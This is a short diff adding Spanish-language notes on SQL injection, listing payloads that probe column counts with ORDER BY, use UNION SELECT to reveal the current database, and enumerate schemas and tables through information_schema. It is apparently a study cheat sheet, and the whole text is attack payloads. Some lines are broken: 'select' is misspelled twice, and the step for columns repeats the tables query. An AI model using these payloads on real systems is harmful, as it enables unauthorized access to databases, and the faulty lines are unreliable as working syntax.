@@ -1,0 +1,26 @@
+* Aplicando ordenamiento de datos:
+
+    ' order by 100-- -
+
+        Si no sale un error que diga no se encuentra tal ordenamiento
+        podemos probar lo siguiente:
+
+    ' union select 1-- -
+
+* Para saber como se llama la base de datos en uso:
+
+    ' union select database()-- -
+
+* Para que nos enumere otras bases de datos existentes:
+
+    ' union select schema_name from information_schema.schemata-- -
+
+* Para que nos enumere las tablas de una base de datos:
+
+    ' union selet table_name from information_schema.tables where table_schema=
+    "registration"
+
+* Para ver las columnas:
+    
+    ' union selet table_name from information_schema.tables where table_schema=
+    "registration"
